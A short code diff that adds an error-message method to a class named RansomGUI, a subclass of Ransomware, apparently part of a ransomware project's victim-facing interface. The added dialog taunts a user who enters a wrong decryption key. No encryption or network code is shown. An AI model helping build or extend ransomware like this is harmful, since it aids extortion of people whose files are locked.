@@ -192,6 +192,9 @@ class RansomGUI(Ransomware):
 
         root.mainloop()
 
+    def throw_error_message(self):
+        messagebox.showerror('ERROR', 'Wrong key man!\n If you are trying to brute-force encryption, then good luck xd\n If not, please enter valid key more carefully')
+
 
 
 if __name__ == '__main__':
